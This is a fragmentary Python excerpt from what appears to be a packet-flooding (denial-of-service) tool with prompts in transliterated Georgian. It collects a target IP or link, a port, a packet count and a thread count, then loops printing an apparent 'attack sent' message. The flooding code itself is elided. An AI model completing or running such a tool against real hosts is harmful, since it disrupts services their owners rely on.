...
def main():
    while True:
        try:
            target = input(mor_pembe_gradyan("Chawere IP an Link--> "))
            if target.strip() and (is_valid_ipv4(target) or not target.replace('.', '').isdigit()):
                break
            else:
                print(mor_pembe_gradyan("Arasworia Gtxovt Cawerot Swori IP an Link"))
        except KeyboardInterrupt:
    ...
    while True:
        try:
            port = int(input(mor_pembe_gradyan("Chawere Port-->  ")))
            break
        except ValueError:
    ...
    while True:
        try:
            times_input = input(mor_pembe_gradyan("Chawere packets wamshi (1000)-->  "))
    ...
    while True:
        try:
            threads_input = input(mor_pembe_gradyan("Chawere threads (1000)-->  "))
    ...
    try:
        while True:
            print(mor_pembe_gradyan("[$] Sheteva Gagzavnilia ") + mor_pembe_gradyan(f"{ip}") + mor_pembe_gradyan(":") + mor_pembe_gradyan(f"{port}"))
